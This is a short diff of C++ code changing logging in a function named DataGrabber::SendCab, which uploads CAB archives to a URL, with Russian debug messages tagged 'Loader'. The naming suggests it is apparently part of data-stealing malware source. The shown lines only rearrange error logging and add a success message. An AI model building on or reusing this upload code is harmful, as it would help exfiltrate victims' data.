@@ -1993,10 +1993,9 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 			ErrorText = HTTPParser::GetHeaderValue(Response.ResponseText, HTTPHeaderError);
 		#endif
 
+		MONITOR_DELIMETED_MSG(BMCONST(MessageSendCabError), CabFileName, "\r\n", ErrorText);
+
 		LDBG("Loader", "Ошибка отправки CAB архива с именем [%s]\r\nError: %s", AppName, ErrorText);
-
-        MONITOR_DELIMETED_MSG(BMCONST(MessageSendCabError), CabFileName, "\r\n", ErrorText);
-
 
 		STR::Free(ErrorText);
 	}
@@ -2006,6 +2005,11 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 	MultiPartData::Free(Data);
 	if (FreeUrl)
 		STR::Free(URL);
+
+	if (Result)
+		LDBG("Loader", "CAB [%s] успешно отправлен", AppName);
+
+
 	return Result;
 }
 
